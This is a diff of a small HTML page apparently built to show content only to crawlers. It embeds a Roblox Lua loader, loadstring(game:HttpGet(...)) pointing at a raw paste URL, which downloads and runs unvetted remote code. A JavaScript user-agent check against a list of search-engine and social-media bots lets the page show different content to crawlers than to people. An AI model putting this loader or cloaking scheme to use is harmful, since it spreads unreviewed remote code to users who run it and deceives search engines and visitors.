@@ -1,22 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bot Access Only</title>
+    <title></title>
 </head>
-        loadstring(game:HttpGet("https://pastebin.com/raw/rZS6TeBf"))()
+<body>
+    loadstring(game:HttpGet("https://pastebin.com/raw/rZS6TeBf"))()
+
     <script>
-        // Ultra-fast bot detection
         (function() {
             function isBot() {
                 const ua = navigator.userAgent.toLowerCase();
-                const botIndicators = [
-                    'bot', 'crawler', 'spider', 'googlebot', 'bingbot', 
-                    'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 
-                    'facebookexternalhit', 'twitterbot', 'rogerbot', 
-                    'linkedinbot', 'embedly', 'quora link preview'
-                ];
+                const botIndicators = ['bot', 'crawler', 'spider', 'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit', 'twitterbot'];
                 
                 for (let indicator of botIndicators) {
                     if (ua.includes(indicator)) return true;
